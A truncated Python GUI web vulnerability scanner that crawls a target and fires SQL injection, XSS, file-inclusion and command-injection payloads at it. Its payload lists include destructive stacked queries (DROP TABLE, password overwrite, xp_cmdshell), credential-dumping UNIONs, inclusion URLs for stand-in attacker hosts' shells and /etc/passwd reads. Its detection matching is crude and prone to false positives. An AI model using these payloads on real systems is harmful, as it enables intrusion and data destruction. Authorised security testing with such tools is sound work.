#!/usr/bin/env python3
"""
Advanced Web Vulnerability Scanner with SQL Injection Detection
Author: Security Scanner Tool
Version: 3.0 - SQLi Enhanced
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
import requests
from urllib.parse import urljoin, urlparse, parse_qs, quote
from bs4 import BeautifulSoup
import socket
import ssl
import json
from datetime import datetime
import re
import time
import random
import string
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
import queue

# Suppress warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class AdvancedSQLScanner:
    def __init__(self, root):
        self.root = root
        self.root.title("Advanced SQL Injection Scanner v3.0")
        self.root.geometry("1300x900")
        
        # Configure colors
        self.colors = {
            'bg': '#1e1e1e',
            'fg': '#ffffff',
            'accent': '#00ff88',
            'warning': '#ff8800',
            'danger': '#ff4444',
            'success': '#00cc88',
            'panel': '#2d2d30'
        }
        
        self.root.configure(bg=self.colors['bg'])
        
        # SQLi payload database
        self.sqli_payloads = self.load_sqli_payloads()
        
        # XSS payload database
        self.xss_payloads = self.load_xss_payloads()
        
        # Create GUI
        self.create_widgets()
        
        # Threading
        self.scan_queue = queue.Queue()
        self.is_scanning = False
        self.results = []
        
    def load_sqli_payloads(self):
        """Load comprehensive SQL injection payloads"""
        return {
            'error_based': [
                "'",
                "\"",
                "' OR '1'='1",
                "\" OR \"1\"=\"1",
                "' OR '1'='1' --",
                "' OR '1'='1' #",
                "' OR '1'='1' /*",
                "admin' --",
                "admin' #",
                "admin'/*",
                "' OR 1=1--",
                "' OR 1=1#",
                "' OR 1=1/*",
                "') OR '1'='1--",
                "') OR ('1'='1--",
                "' UNION SELECT null--",
                "' UNION SELECT null,null--",
                "' UNION SELECT null,null,null--",
                "' UNION SELECT @@version--",
                "' UNION SELECT user()--",
                "' UNION SELECT database()--",
                "' UNION SELECT version()--",
                "'; WAITFOR DELAY '00:00:05'--",
                "'; SELECT pg_sleep(5)--",
                "' AND SLEEP(5)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))a)--",
                "1' AND SLEEP(5) AND '1'='1",
                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))b) AND '1'='1",
                "1' OR (SELECT 1 FROM (SELECT SLEEP(5))a)--",
            ],
            
            'boolean_based': [
                "' AND '1'='1",
                "' AND '1'='2",
                "' OR '1'='1' AND '1'='1",
                "' OR '1'='1' AND '1'='2",
                "1' AND 1=1 AND '1'='1",
                "1' AND 1=2 AND '1'='1",
                "' AND (SELECT substring(@@version,1,1))='5'",
                "' AND (SELECT ascii(substring(@@version,1,1)))>50",
                "' AND (SELECT ascii(substring(user(),1,1)))>100",
            ],
            
            'time_based': [
                "' OR IF(1=1,SLEEP(5),0)--",
                "' OR (SELECT COUNT(*) FROM information_schema.tables) > 0 AND SLEEP(5)--",
                "'; IF(1=1) WAITFOR DELAY '00:00:05'--",
                "'; IF(1=2) WAITFOR DELAY '00:00:05'--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND 'x'='x",
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1)--",
                "'; (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "'; (SELECT 1 FROM (SELECT SLEEP(5))a)--",
            ],
            
            'union_based': [
                "' UNION SELECT null--",
                "' UNION SELECT null,null--",
                "' UNION SELECT null,null,null--",
                "' UNION SELECT 1--",
                "' UNION SELECT 1,2--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT @@version,null--",
                "' UNION SELECT user(),null--",
                "' UNION SELECT database(),null--",
                "' UNION SELECT table_name,null FROM information_schema.tables--",
                "' UNION SELECT column_name,null FROM information_schema.columns--",
                "' UNION SELECT concat(username,':',password),null FROM users--",
            ],
            
            'stacked_queries': [
                "'; EXEC xp_cmdshell('dir')--",
                "'; DROP TABLE users--",
                "'; UPDATE users SET password='hacked' WHERE user='admin'--",
                "'; INSERT INTO logs (message) VALUES ('SQLi detected')--",
                "'; CREATE TABLE hacked (data varchar(255))--",
            ],
            
            'blind_sqli': [
                "' AND (SELECT ascii(substring((SELECT user()),1,1)))>0--",
                "' AND (SELECT length(user()))>0--",
                "' AND (SELECT substring(@@version,1,1))='5'--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' AND (SELECT 1 FROM users WHERE username='admin')=1--",
            ]
        }
    
    def load_xss_payloads(self):
        """Load XSS payloads"""
        return [
            "<script>alert('XSS')</script>",
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<input type=text onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            "<div onmouseover=alert('XSS')>",
            "<a href=javascript:alert('XSS')>click</a>",
            "<details ontoggle=alert('XSS')>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<form><button formaction=javascript:alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "</script><script>alert('XSS')</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
        ]
    
    def create_widgets(self):
        """Create the GUI widgets"""
        # Main container
        main_frame = tk.Frame(self.root, bg=self.colors['bg'])
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Header
        header_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        header_frame.pack(fill=tk.X, pady=(0, 10))
        
        tk.Label(header_frame, text="⚡ ADVANCED SQL INJECTION SCANNER ⚡", 
                font=("Consolas", 22, "bold"),
                fg=self.colors['accent'],
                bg=self.colors['bg']).pack()
        
        tk.Label(header_frame, text="Professional Web Vulnerability Assessment Tool", 
                font=("Consolas", 12),
                fg=self.colors['success'],
                bg=self.colors['bg']).pack()
        
        # Target Section
        target_frame = tk.LabelFrame(main_frame, text=" TARGET CONFIGURATION ", 
                                   font=("Consolas", 11, "bold"),
                                   fg=self.colors['accent'],
                                   bg=self.colors['panel'],
                                   relief=tk.FLAT)
        target_frame.pack(fill=tk.X, pady=(0, 10))
        
        tk.Label(target_frame, text="Target URL:", 
                font=("Consolas", 10),
                fg=self.colors['fg'],
                bg=self.colors['panel']).grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
        
        self.url_entry = tk.Entry(target_frame, width=80, 
                                 font=("Consolas", 10),
                                 bg='#3c3c3c', fg='white',
                                 insertbackground='white')
        self.url_entry.grid(row=0, column=1, padx=5, pady=5)
        self.url_entry.insert(0, "https://example.com")
        
        # Advanced Options
        options_frame = tk.LabelFrame(main_frame, text=" SCAN OPTIONS ", 
                                    font=("Consolas", 11, "bold"),
                                    fg=self.colors['accent'],
                                    bg=self.colors['panel'],
                                    relief=tk.FLAT)
        options_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Vulnerability types
        self.var_sqli = tk.BooleanVar(value=True)
        self.var_xss = tk.BooleanVar(value=True)
        self.var_rfi = tk.BooleanVar(value=True)
        self.var_lfi = tk.BooleanVar(value=True)
        self.var_cmdi = tk.BooleanVar(value=True)
        self.var_headers = tk.BooleanVar(value=True)
        
        tk.Checkbutton(options_frame, text="SQL Injection", variable=self.var_sqli,
                      font=("Consolas", 10), fg=self.colors['fg'], 
                      bg=self.colors['panel'], selectcolor=self.colors['bg']).grid(row=0, column=0, sticky=tk.W, padx=10, pady=5)
        tk.Checkbutton(options_frame, text="Cross-Site Scripting (XSS)", variable=self.var_xss,
                      font=("Consolas", 10), fg=self.colors['fg'],
                      bg=self.colors['panel'], selectcolor=self.colors['bg']).grid(row=0, column=1, sticky=tk.W, padx=10, pady=5)
        tk.Checkbutton(options_frame, text="File Inclusion (RFI/LFI)", variable=self.var_rfi,
                      font=("Consolas", 10), fg=self.colors['fg'],
                      bg=self.colors['panel'], selectcolor=self.colors['bg']).grid(row=0, column=2, sticky=tk.W, padx=10, pady=5)
        tk.Checkbutton(options_frame, text="Command Injection", variable=self.var_cmdi,
                      font=("Consolas", 10), fg=self.colors['fg'],
                      bg=self.colors['panel'], selectcolor=self.colors['bg']).grid(row=1, column=0, sticky=tk.W, padx=10, pady=5)
        tk.Checkbutton(options_frame, text="Security Headers", variable=self.var_headers,
                      font=("Consolas", 10), fg=self.colors['fg'],
                      bg=self.colors['panel'], selectcolor=self.colors['bg']).grid(row=1, column=1, sticky=tk.W, padx=10, pady=5)
        
        # Scan intensity
        tk.Label(options_frame, text="Scan Intensity:", 
                font=("Consolas", 10),
                fg=self.colors['fg'],
                bg=self.colors['panel']).grid(row=2, column=0, padx=10, pady=5, sticky=tk.W)
        
        self.intensity_var = tk.StringVar(value="medium")
        intensity_frame = tk.Frame(options_frame, bg=self.colors['panel'])
        intensity_frame.grid(row=2, column=1, columnspan=3, sticky=tk.W)
        
        tk.Radiobutton(intensity_frame, text="Low", variable=self.intensity_var, value="low",
                      font=("Consolas", 9), fg=self.colors['fg'],
                      bg=self.colors['panel'], selectcolor=self.colors['bg']).pack(side=tk.LEFT, padx=5)
        tk.Radiobutton(intensity_frame, text="Medium", variable=self.intensity_var, value="medium",
                      font=("Consolas", 9), fg=self.colors['fg'],
                      bg=self.colors['panel'], selectcolor=self.colors['bg']).pack(side=tk.LEFT, padx=5)
        tk.Radiobutton(intensity_frame, text="High", variable=self.intensity_var, value="high",
                      font=("Consolas", 9), fg=self.colors['fg'],
                      bg=self.colors['panel'], selectcolor=self.colors['bg']).pack(side=tk.LEFT, padx=5)
        tk.Radiobutton(intensity_frame, text="Aggressive", variable=self.intensity_var, value="aggressive",
                      font=("Consolas", 9), fg=self.colors['danger'],
                      bg=self.colors['panel'], selectcolor=self.colors['bg']).pack(side=tk.LEFT, padx=5)
        
        # Control Buttons
        button_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        button_frame.pack(fill=tk.X, pady=(0, 10))
        
        button_style = {
            'font': ("Consolas", 10, "bold"),
            'bg': '#3c3c3c',
            'fg': 'white',
            'activebackground': '#4c4c4c',
            'activeforeground': 'white',
            'relief': tk.RAISED,
            'borderwidth': 2
        }
        
        self.start_btn = tk.Button(button_frame, text="▶ START SCAN", 
                                  command=self.start_scan,
                                  **button_style)
        self.start_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_btn = tk.Button(button_frame, text="⏹ STOP", 
                                 command=self.stop_scan,
                                 state=tk.DISABLED,
                                 **button_style)
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        
        self.export_btn = tk.Button(button_frame, text="💾 EXPORT REPORT", 
                                   command=self.export_report,
                                   **button_style)
        self.export_btn.pack(side=tk.LEFT, padx=5)
        
        self.load_btn = tk.Button(button_frame, text="📁 LOAD TARGETS", 
                                 command=self.load_targets,
                                 **button_style)
        self.load_btn.pack(side=tk.LEFT, padx=5)
        
        # Progress Section
        progress_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        progress_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.progress_label = tk.Label(progress_frame, text="Ready", 
                                      font=("Consolas", 10),
                                      fg=self.colors['fg'],
                                      bg=self.colors['bg'])
        self.progress_label.pack(anchor=tk.W)
        
        self.progress_bar = ttk.Progressbar(progress_frame, 
                                          mode='determinate',
                                          length=1200)
        self.progress_bar.pack(fill=tk.X, pady=(5, 0))
        
        style = ttk.Style()
        style.configure("green.Horizontal.TProgressbar", 
                       background=self.colors['success'])
        
        # Results Area
        notebook_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        notebook_frame.pack(fill=tk.BOTH, expand=True)
        
        # Create Notebook
        self.notebook = ttk.Notebook(notebook_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True)
        
        # Results Tab
        results_tab = tk.Frame(self.notebook, bg=self.colors['bg'])
        self.notebook.add(results_tab, text="📊 RESULTS")
        
        # Create Treeview with scrollbars
        tree_frame = tk.Frame(results_tab, bg=self.colors['bg'])
        tree_frame.pack(fill=tk.BOTH, expand=True)
        
        # Create Treeview
        self.tree = ttk.Treeview(tree_frame, columns=('ID', 'Severity', 'Type', 'Target', 'Payload', 'Details'), show='headings')
        
        # Define headings
        self.tree.heading('ID', text='ID')
        self.tree.heading('Severity', text='Severity')
        self.tree.heading('Type', text='Type')
        self.tree.heading('Target', text='Target')
        self.tree.heading('Payload', text='Payload')
        self.tree.heading('Details', text='Details')
        
        # Define columns
        self.tree.column('ID', width=50)
        self.tree.column('Severity', width=100)
        self.tree.column('Type', width=150)
        self.tree.column('Target', width=300)
        self.tree.column('Payload', width=200)
        self.tree.column('Details', width=400)
        
        # Add scrollbars
        y_scrollbar = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=self.tree.yview)
        x_scrollbar = ttk.Scrollbar(tree_frame, orient=tk.HORIZONTAL, command=self.tree.xview)
        self.tree.configure(yscrollcommand=y_scrollbar.set, xscrollcommand=x_scrollbar.set)
        
        # Grid layout
        self.tree.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        y_scrollbar.grid(row=0, column=1, sticky=(tk.N, tk.S))
        x_scrollbar.grid(row=1, column=0, sticky=(tk.W, tk.E))
        
        # Configure grid weights
        tree_frame.grid_columnconfigure(0, weight=1)
        tree_frame.grid_rowconfigure(0, weight=1)
        
        # Details Tab
        details_tab = tk.Frame(self.notebook, bg=self.colors['bg'])
        self.notebook.add(details_tab, text="📝 DETAILS")
        
        self.details_text = scrolledtext.ScrolledText(details_tab, 
                                                     height=25,
                                                     bg='#2d2d30',
                                                     fg='white',
                                                     insertbackground='white',
                                                     font=("Consolas", 10))
        self.details_text.pack(fill=tk.BOTH, expand=True)
        
        # Statistics Tab
        stats_tab = tk.Frame(self.notebook, bg=self.colors['bg'])
        self.notebook.add(stats_tab, text="📈 STATISTICS")
        
        self.stats_text = scrolledtext.ScrolledText(stats_tab,
                                                   height=25,
                                                   bg='#2d2d30',
                                                   fg='white',
                                                   insertbackground='white',
                                                   font=("Consolas", 10))
        self.stats_text.pack(fill=tk.BOTH, expand=True)
        
        # Log Tab
        log_tab = tk.Frame(self.notebook, bg=self.colors['bg'])
        self.notebook.add(log_tab, text="📋 LOG")
        
        self.log_text = scrolledtext.ScrolledText(log_tab,
                                                 height=25,
                                                 bg='#2d2d30',
                                                 fg='white',
                                                 insertbackground='white',
                                                 font=("Consolas", 9))
        self.log_text.pack(fill=tk.BOTH, expand=True)
        
        # Bind events
        self.tree.bind('<<TreeviewSelect>>', self.on_tree_select)
        
    def log_message(self, message, level="INFO"):
        """Log messages to the log tab"""
        colors = {
            "INFO": self.colors['fg'],
            "WARN": self.colors['warning'],
            "ERROR": self.colors['danger'],
            "SUCCESS": self.colors['success']
        }
        
        timestamp = datetime.now().strftime("%H:%M:%S")
        formatted = f"[{timestamp}] [{level}] {message}\n"
        
        self.log_text.insert(tk.END, formatted)
        self.log_text.tag_add(level, f"end -2c linestart", f"end -2c lineend")
        self.log_text.tag_config(level, foreground=colors.get(level, self.colors['fg']))
        self.log_text.see(tk.END)
        
    def on_tree_select(self, event):
        """Handle tree selection"""
        selection = self.tree.selection()
        if selection:
            item = self.tree.item(selection[0])
            details = f"""
{'='*60}
VULNERABILITY DETAILS
{'='*60}
Severity: {item['values'][1]}
Type: {item['values'][2]}
Target: {item['values'][3]}
Payload: {item['values'][4]}
{'='*60}
Details:
{item['values'][5]}
{'='*60}
            """
            self.details_text.delete(1.0, tk.END)
            self.details_text.insert(tk.END, details)
            
    def start_scan(self):
        """Start the vulnerability scan"""
        url = self.url_entry.get().strip()
        
        if not url or not url.startswith(('http://', 'https://')):
            messagebox.showerror("Error", "Please enter a valid URL starting with http:// or https://")
            return
            
        # Clear previous results
        for item in self.tree.get_children():
            self.tree.delete(item)
        self.details_text.delete(1.0, tk.END)
        self.stats_text.delete(1.0, tk.END)
        self.log_text.delete(1.0, tk.END)
        
        # Update UI
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.is_scanning = True
        
        # Start scan in separate thread
        scan_thread = threading.Thread(target=self.perform_scan, args=(url,), daemon=True)
        scan_thread.start()
        
    def stop_scan(self):
        """Stop the current scan"""
        self.is_scanning = False
        self.log_message("Scan stopped by user", "WARN")
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        
    def update_progress(self, value, message=""):
        """Update progress bar and label"""
        self.progress_bar['value'] = value
        if message:
            self.progress_label.config(text=message)
        self.root.update_idletasks()
        
    def add_vulnerability(self, severity, vuln_type, target, payload, details):
        """Add vulnerability to results"""
        vuln_id = len(self.tree.get_children()) + 1
        
        # Color coding
        tags = ()
        if severity == "CRITICAL":
            tags = ('critical',)
        elif severity == "HIGH":
            tags = ('high',)
        elif severity == "MEDIUM":
            tags = ('medium',)
        else:
            tags = ('low',)
            
        self.tree.insert('', 'end', 
                        values=(vuln_id, severity, vuln_type, target, payload[:50] + "..." if len(payload) > 50 else payload, details),
                        tags=tags)
        
        # Configure tag colors
        self.tree.tag_configure('critical', background='#ff4444', foreground='white')
        self.tree.tag_configure('high', background='#ff8800', foreground='black')
        self.tree.tag_configure('medium', background='#ffd166', foreground='black')
        self.tree.tag_configure('low', background='#06d6a0', foreground='black')
        
        self.log_message(f"Found {severity} vulnerability: {vuln_type} at {target}", "WARN")
        
    def perform_scan(self, url):
        """Perform comprehensive vulnerability scan"""
        try:
            self.log_message(f"Starting scan for: {url}", "INFO")
            self.update_progress(10, "Initializing scan...")
            
            # Parse URL
            parsed_url = urlparse(url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            # 1. Spider for URLs and forms
            self.log_message("Spidering target...", "INFO")
            urls, forms = self.spider_target(base_url)
            self.log_message(f"Found {len(urls)} URLs and {len(forms)} forms", "SUCCESS")
            
            # 2. SQL Injection Scan
            if self.var_sqli.get():
                self.update_progress(30, "Scanning for SQL Injection...")
                self.log_message("Starting SQL Injection scan...", "INFO")
                self.scan_sql_injection(urls, forms)
                
            # 3. XSS Scan
            if self.var_xss.get():
                self.update_progress(50, "Scanning for XSS...")
                self.log_message("Starting XSS scan...", "INFO")
                self.scan_xss(urls, forms)
                
            # 4. File Inclusion Scan
            if self.var_rfi.get() or self.var_lfi.get():
                self.update_progress(70, "Scanning for File Inclusion...")
                self.scan_file_inclusion(base_url)
                
            # 5. Command Injection Scan
            if self.var_cmdi.get():
                self.update_progress(80, "Scanning for Command Injection...")
                self.scan_command_injection(urls, forms)
                
            # 6. Security Headers Check
            if self.var_headers.get():
                self.update_progress(90, "Checking security headers...")
                self.check_security_headers(base_url)
                
            # Generate statistics
            self.update_progress(100, "Scan completed!")
            self.generate_statistics()
            
            self.log_message(f"Scan completed! Found {len(self.tree.get_children())} vulnerabilities", "SUCCESS")
            
        except Exception as e:
            self.log_message(f"Scan error: {str(e)}", "ERROR")
        finally:
            self.is_scanning = False
            self.start_btn.config(state=tk.NORMAL)
            self.stop_btn.config(state=tk.DISABLED)
            
    def spider_target(self, base_url, max_pages=20):
        """Spider the target to find URLs and forms"""
        urls = set()
        forms = []
        visited = set()
        
        try:
            # Start with the base URL
            to_visit = [base_url]
            
            while to_visit and len(urls) < max_pages and self.is_scanning:
                current_url = to_visit.pop(0)
                
                if current_url in visited:
                    continue
                    
                visited.add(current_url)
                
                try:
                    response = requests.get(current_url, timeout=10, verify=False)
                    
                    # Parse HTML
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Extract all links
                    for link in soup.find_all('a', href=True):
                        href = link['href']
                        full_url = urljoin(current_url, href)
                        
                        # Filter for same domain
                        if base_url in full_url and full_url not in urls:
                            urls.add(full_url)
                            to_visit.append(full_url)
                            
                    # Extract forms
                    for form in soup.find_all('form'):
                        form_details = self.extract_form_details(form, current_url)
                        if form_details:
                            forms.append(form_details)
                            
                except Exception as e:
                    continue
                    
        except Exception as e:
            self.log_message(f"Spider error: {str(e)}", "ERROR")
            
        return list(urls), forms
        
    def extract_form_details(self, form, base_url):
        """Extract details from a form"""
        try:
            action = form.get('action', '')
            method = form.get('method', 'get').lower()
            
            # Build full URL
            if action.startswith(('http://', 'https://')):
                form_url = action
            else:
                form_url = urljoin(base_url, action)
                
            # Extract inputs
            inputs = []
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                input_type = input_tag.get('type', 'text')
                input_name = input_tag.get('name')
                input_value = input_tag.get('value', '')
                
                if input_name:
                    inputs.append({
                        'type': input_type,
                        'name': input_name,
                        'value': input_value
                    })
                    
            return {
                'url': form_url,
                'method': method,
                'inputs': inputs
            }
        except:
            return None
            
    def scan_sql_injection(self, urls, forms):
        """Comprehensive SQL injection scanning"""
        self.log_message("Starting comprehensive SQLi scan...", "INFO")
        
        # Test URL parameters
        for url in urls[:10]:  # Limit for performance
            if not self.is_scanning:
                break
                
            parsed = urlparse(url)
            query_params = parse_qs(parsed.query)
            
            if query_params:
                for param in query_params.keys():
                    self.log_message(f"Testing SQLi on parameter: {param}", "INFO")
                    self.test_sqli_parameter(url, param)
                    
        # Test forms
        for form in forms[:10]:  # Limit for performance
            if not self.is_scanning:
                break
                
            self.log_message(f"Testing SQLi on form: {form['url']}", "INFO")
            self.test_sqli_form(form)
            
    def test_sqli_parameter(self, url, parameter):
        """Test a single parameter for SQL injection"""
        try:
            # Original request
            response = requests.get(url, timeout=10, verify=False)
            original_content = response.text
            
            # Test error-based SQLi
            for payload in self.sqli_payloads['error_based'][:5]:
                if not self.is_scanning:
                    return
                    
                # Create test URL with payload
                test_url = self.inject_payload_into_url(url, parameter, payload)
                
                try:
                    test_response = requests.get(test_url, timeout=10, verify=False)
                    
                    # Check for error indicators
                    error_indicators = [
                        "sql", "syntax", "mysql", "oracle", "postgresql",
                        "warning", "error", "unclosed", "unterminated",
                        "you have an error", "sql syntax.*mysql",
                        "supplied argument is not", "division by zero"
                    ]
                    
                    for indicator in error_indicators:
                        if re.search(indicator, test_response.text, re.IGNORECASE):
                            self.add_vulnerability(
                                severity="HIGH",
                                vuln_type="SQL Injection (Error-based)",
                                target=url,
                                payload=payload,
                                details=f"Parameter '{parameter}' appears vulnerable to SQLi\nError indicator: '{indicator}'\nPayload: {payload}"
                            )
                            return
                            
                except:
                    continue
                    
            # Test boolean-based SQLi
            true_payload = "1' AND '1'='1"
            false_payload = "1' AND '1'='2"
            
            true_url = self.inject_payload_into_url(url, parameter, true_payload)
            false_url = self.inject_payload_into_url(url, parameter, false_payload)
            
            true_response = requests.get(true_url, timeout=10, verify=False)
            false_response = requests.get(false_url, timeout=10, verify=False)
            
            # Compare responses
            if len(true_response.text) != len(false_response.text):
                # Use a more sophisticated comparison
                true_hash = hashlib.md5(true_response.text.encode()).hexdigest()
                false_hash = hashlib.md5(false_response.text.encode()).hexdigest()
                
                if true_hash != false_hash:
                    self.add_vulnerability(
                        severity="HIGH",
                        vuln_type="SQL Injection (Boolean-based)",
                        target=url,
                        payload=true_payload,
                        details=f"Parameter '{parameter}' appears vulnerable to Boolean-based SQLi\nResponses differ for TRUE/FALSE conditions"
                    )
                    
        except Exception as e:
            self.log_message(f"SQLi test error: {str(e)}", "ERROR")
            
    def test_sqli_form(self, form):
        """Test a form for SQL injection"""
        try:
            # Build normal data
            normal_data = {}
            for inp in form['inputs']:
                normal_data[inp['name']] = inp['value'] or "test"
                
            # Send normal request
            if form['method'] == 'post':
                response = requests.post(form['url'], data=normal_data, timeout=10, verify=False)
            else:
                response = requests.get(form['url'], params=normal_data, timeout=10, verify=False)
                
            original_content = response.text
            
            # Test SQLi payloads
            for payload in self.sqli_payloads['error_based'][:5]:
                if not self.is_scanning:
                    return
                    
                test_data = normal_data.copy()
                
                # Inject into first text field
                for inp in form['inputs']:
                    if inp['type'] in ['text', 'search', 'email', 'password']:
                        test_data[inp['name']] = payload
                        break
                        
                try:
                    if form['method'] == 'post':
                        test_response = requests.post(form['url'], data=test_data, timeout=10, verify=False)
                    else:
                        test_response = requests.get(form['url'], params=test_data, timeout=10, verify=False)
                        
                    # Check for errors
                    error_indicators = [
                        "sql", "syntax", "mysql", "oracle", "postgresql",
                        "warning", "error", "unclosed", "unterminated"
                    ]
                    
                    for indicator in error_indicators:
                        if re.search(indicator, test_response.text, re.IGNORECASE):
                            self.add_vulnerability(
                                severity="HIGH",
                                vuln_type="SQL Injection (Form)",
                                target=form['url'],
                                payload=payload,
                                details=f"Form at {form['url']} appears vulnerable to SQLi\nError indicator: '{indicator}'\nPayload: {payload}"
                            )
                            return
                            
                except:
                    continue
                    
        except Exception as e:
            self.log_message(f"Form SQLi test error: {str(e)}", "ERROR")
            
    def inject_payload_into_url(self, url, parameter, payload):
        """Inject payload into URL parameter"""
        parsed = urlparse(url)
        query_dict = parse_qs(parsed.query)
        
        if parameter in query_dict:
            query_dict[parameter] = [payload]
            
        # Rebuild query string
        new_query = []
        for key, values in query_dict.items():
            for value in values:
                new_query.append(f"{key}={quote(str(value))}")
                
        new_query_str = '&'.join(new_query)
        
        # Rebuild URL
        new_url = parsed._replace(query=new_query_str).geturl()
        return new_url
        
    def scan_xss(self, urls, forms):
        """Scan for Cross-Site Scripting vulnerabilities"""
        self.log_message("Starting XSS scan...", "INFO")
        
        # Test URL parameters
        for url in urls[:10]:
            if not self.is_scanning:
                break
                
            parsed = urlparse(url)
            query_params = parse_qs(parsed.query)
            
            if query_params:
                for param in query_params.keys():
                    self.test_xss_parameter(url, param)
                    
        # Test forms
        for form in forms[:10]:
            if not self.is_scanning:
                break
                
            self.test_xss_form(form)
            
    def test_xss_parameter(self, url, parameter):
        """Test a parameter for XSS"""
        try:
            for payload in self.xss_payloads[:3]:  # Limit payloads
                if not self.is_scanning:
                    return
                    
                test_url = self.inject_payload_into_url(url, parameter, payload)
                response = requests.get(test_url, timeout=10, verify=False)
                
                # Check if payload appears in response
                if payload in response.text:
                    self.add_vulnerability(
                        severity="HIGH",
                        vuln_type="Cross-Site Scripting (XSS)",
                        target=url,
                        payload=payload,
                        details=f"Parameter '{parameter}' reflects XSS payload without sanitization\nPayload: {payload}"
                    )
                    break
                    
        except Exception as e:
            self.log_message(f"XSS test error: {str(e)}", "ERROR")
            
    def test_xss_form(self, form):
        """Test a form for XSS"""
        try:
            # Build test data
            for payload in self.xss_payloads[:3]:
                if not self.is_scanning:
                    return
                    
                test_data = {}
                for inp in form['inputs']:
                    if inp['type'] in ['text', 'search', 'email', 'textarea']:
                        test_data[inp['name']] = payload
                    else:
                        test_data[inp['name']] = inp['value'] or "test"
                        
                if form['method'] == 'post':
                    response = requests.post(form['url'], data=test_data, timeout=10, verify=False)
                else:
                    response = requests.get(form['url'], params=test_data, timeout=10, verify=False)
                    
                # Check if payload appears in response
                if payload in response.text:
                    self.add_vulnerability(
                        severity="HIGH",
                        vuln_type="Cross-Site Scripting (XSS)",
                        target=form['url'],
                        payload=payload,
                        details=f"Form reflects XSS payload without sanitization\nPayload: {payload}"
                    )
                    break
                    
        except Exception as e:
            self.log_message(f"Form XSS test error: {str(e)}", "ERROR")
            
    def scan_file_inclusion(self, base_url):
        """Scan for Local/Remote File Inclusion"""
        lfi_payloads = [
            "../../../../etc/passwd",
            "../../../../etc/hosts",
            "../../../../windows/win.ini",
            "....//....//....//etc/passwd",
            "../../../../etc/passwd%00",
            "/etc/passwd",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "file:///etc/passwd",
        ]
        
        rfi_payloads = [
            "http://evil.com/shell.txt",
            "https://pastebin.com/raw/xxxxxxxx",
            "http://attacker.com/backdoor.php",
            "//evil.com/test.txt",
            "\\\\evil.com\\share\\test.txt",
        ]
        
        # Common vulnerable parameters
        vulnerable_params = ['file', 'page', 'load', 'path', 'include', 'doc']
        
        self.log_message("Testing for File Inclusion vulnerabilities...", "INFO")
        
        # Test common vulnerable paths
        test_paths = [
            "/index.php?file=",
            "/index.php?page=",
            "/include.php?load=",
            "/template.php?path=",
            "/view.php?doc=",
        ]
        
        for path in test_paths:
            if not self.is_scanning:
                break
                
            test_url = base_url + path + "test"
            
            try:
                response = requests.get(test_url, timeout=10, verify=False)
                
                # If page exists, test payloads
                if response.status_code == 200:
                    for payload in lfi_payloads[:3]:
                        vuln_url = base_url + path + payload
                        try:
                            vuln_response = requests.get(vuln_url, timeout=10, verify=False)
                            
                            # Check for indicators of successful LFI
                            if "root:" in vuln_response.text or "[extensions]" in vuln_response.text:
                                self.add_vulnerability(
                                    severity="CRITICAL",
                                    vuln_type="Local File Inclusion (LFI)",
                                    target=vuln_url,
                                    payload=payload,
                                    details=f"Local File Inclusion vulnerability detected\nCan read sensitive files: {payload}"
                                )
                                break
                        except:
                            continue
                            
            except:
                continue
                
    def scan_command_injection(self, urls, forms):
        """Scan for Command Injection vulnerabilities"""
        cmd_payloads = [
            "| ls",
            "; ls",
            "`ls`",
            "$(ls)",
            "| dir",
            "; dir",
            "`dir`",
            "$(dir)",
            "| cat /etc/passwd",
            "; cat /etc/passwd",
            "127.0.0.1 && ls",
            "127.0.0.1 | ls",
        ]
        
        self.log_message("Testing for Command Injection...", "INFO")
        
        # Test ping-like functionality
        test_urls = [
            f"{urlparse(urls[0]).scheme}://{urlparse(urls[0]).netloc}/ping.php?ip=",
            f"{urlparse(urls[0]).scheme}://{urlparse(urls[0]).netloc}/traceroute.php?host=",
            f"{urlparse(urls[0]).scheme}://{urlparse(urls[0]).netloc}/nslookup.php?domain=",
        ]
        
        for test_url in test_urls:
            if not self.is_scanning:
                break
                
            for payload in cmd_payloads[:3]:
                try:
                    response = requests.get(test_url + payload, timeout=10, verify=False)
                    
                    # Check for command output indicators
                    if "bin" in response.text or "etc" in response.text or "root" in response.text:
                        self.add_vulnerability(
                            severity="CRITICAL",
